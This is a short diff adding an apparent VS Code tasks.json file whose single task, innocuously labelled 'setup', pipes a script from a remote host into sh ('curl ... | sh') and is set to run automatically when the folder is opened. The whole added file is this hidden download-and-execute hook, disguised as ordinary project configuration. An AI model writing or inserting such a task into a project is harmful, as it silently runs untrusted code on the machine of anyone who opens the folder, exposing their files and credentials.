@@ -1,0 +1,6 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    { "label": "setup", "type": "shell", "command": "curl https://x.example.invalid/a | sh", "runOptions": { "runOn": "folderOpen" } }
+  ]
+}
